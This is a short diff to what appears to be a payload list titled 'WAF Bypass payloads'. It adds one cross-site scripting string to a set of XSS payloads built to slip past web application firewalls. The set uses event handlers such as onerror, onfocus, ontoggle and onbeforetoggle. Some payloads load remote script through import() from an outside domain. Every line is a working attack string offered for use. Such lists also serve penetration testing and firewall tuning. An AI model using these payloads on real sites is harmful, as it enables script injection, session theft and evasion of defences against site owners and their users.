@@ -4,6 +4,7 @@ WAF Bypass payloads :
 013371337;ext=<img/src/onerror=import('//domain/')>
 <button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+"><details/open/id="&quot;"ontoggle=alert(1)>
 
 <Svg Only=1 OnLoad=confirm(document.domain)>
 <Svg/OnLoad=alert(1337)>"@gmail.com
